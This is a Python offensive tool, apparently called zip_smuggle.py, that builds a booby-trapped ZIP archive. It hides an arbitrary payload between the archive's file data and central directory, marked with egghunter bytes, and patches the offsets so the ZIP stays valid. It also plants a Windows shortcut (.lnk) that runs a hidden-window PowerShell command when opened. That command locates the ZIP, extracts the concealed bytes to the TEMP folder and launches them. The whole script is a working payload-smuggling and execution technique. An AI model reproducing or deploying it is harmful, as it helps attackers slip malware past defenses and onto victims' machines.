#!/usr/bin/python3
import sys
import os
import struct
import shutil
from pathlib import Path

def find_eocd_offset(zip_data):
    eocd_sig = b'\x50\x4b\x05\x06'
    max_comment_length = 0xFFFF
    search_area = zip_data[-(max_comment_length + 22):]
    rel_offset = search_area.rfind(eocd_sig)
    if rel_offset == -1:
        raise ValueError("EOCD not found")
    return len(zip_data) - len(search_area) + rel_offset

def update_eocd_cd_offset(eocd_data, new_cd_offset):
    # EOCD structure: bytes 16-20 is the offset of the start of central directory
    return eocd_data[:16] + struct.pack('<I', new_cd_offset) + eocd_data[20:]

def inject_zip(original_zip, implant_file):
    with open(original_zip, 'rb') as f:
        zip_data = f.read()
    with open(implant_file, 'rb') as f:
        implant_data = f.read()

    # Add egghunter bytes to start of binary
    implant_data = b'\x55\x55\x55\x55' + implant_data

    eocd_offset = find_eocd_offset(zip_data)
    eocd = zip_data[eocd_offset:eocd_offset + 22]

    old_cd_offset = struct.unpack('<I', eocd[16:20])[0]
    new_cd_offset = old_cd_offset + len(implant_data)

    # Update EOCD
    updated_eocd = update_eocd_cd_offset(eocd, new_cd_offset)

    # Rebuild ZIP: [file data][implant][central directory][updated EOCD]
    new_zip_data = zip_data[:old_cd_offset] + implant_data + zip_data[old_cd_offset:eocd_offset] + updated_eocd

    with open(original_zip, 'wb') as f:
        f.write(new_zip_data)

    print(f"Created {original_zip}")
    print(f"Old Central Directory offset: {old_cd_offset}")
    print(f"New Central Directory offset: {new_cd_offset}")
    print(f"EOCD offset: {eocd_offset + len(implant_data)}")

if __name__ == "__main__":

    if len(sys.argv) != 3:
        print("Usage:   python3 zip_smuggle.py <payload name> </file/to/embed>")
        print("Example: python3 zip_smuggle.py important_docs /home/ubuntu/zip_smuggling/testdata.txt")

    payloadname = sys.argv[1]
    filetosmuggle = sys.argv[2]
    outfile = payloadname + ".zip"
    szPayload = str(os.path.getsize(filetosmuggle))

    print("payloadname: " + payloadname)
    print("file to smuggle: " + filetosmuggle)

    #Command to be stored in .lnk. Make sure you use escape characters as necessary for Python!
    command = '"$name = \\"' + payloadname + '\\";$file = (get-childitem -Pa $Env:USERPROFILE -Re -Inc *$name.zip).fullname;$bytes=[System.IO.File]::ReadAllBytes($file);$size = (0..($bytes.Length - 4) | Where-Object {$bytes[$_] -eq 0x55 -and $bytes[$_+1] -eq 0x55 -and $bytes[$_+2] -eq 0x55 -and $bytes[$_+3] -eq 0x55 })[0] + 4;$length=' + szPayload + ';$chunk=$bytes[$size..($size+$length-1)];$out = \\"$Env:TEMP\\$name.txt\\";[System.IO.File]::WriteAllBytes($out,$chunk);Invoke-Item $out"'
    print("Powershell command: powershell.exe -w 1 -c " + command)

    lengthCommand = len(command) + 8

    #Read in .lnk template.  Template file contains powershell as target and is pre-seeded with '-w 1 -c ""'.  Above command will replace the "".
    with open(os.path.join(os.path.dirname(os.path.realpath(__file__)), "template", "template.lnk"), 'rb') as f:
        s = f.read()

    # '\x22\x00\x22\x00' represents the "" pre-seed we are going to search for and replace. Because it's UTF-16 there are null bytes inbetween the characters.
    # subtract 18 from location of byte pattern to locate bytes that represents length of args
    locLenByte = s.find(b'\x22\x00\x22\x00') - 18

    #Patch in correct length byte.
    s = s[:locLenByte] + lengthCommand.to_bytes(2, byteorder='little') + s[locLenByte + 2:]

    #replace '".".' with command
    s = s.replace(b'\x22\x00\x22\x00', bytes(command, 'UTF-16'))

    #strip out encoding header
    s = s.replace(b'\xff\xfe', b'')

    # Make directories that we will save lnk in and zip
    os.makedirs(os.path.join(payloadname, payloadname),exist_ok=True)

    # Write file
    lnk = os.path.join(payloadname, payloadname, payloadname) + ".lnk"
    with open(lnk, 'wb') as f:
        f.write(s)
    f.close

    # Zip folder and place assembled zip payload at proper location
    shutil.make_archive(payloadname, 'zip', payloadname)

    # Delete folder now that it has been zipped
    shutil.rmtree(payloadname, ignore_errors=False)

    # Inject file into zip
    inject_zip(outfile , filetosmuggle)

    print("[+] Done. File saved at " + outfile)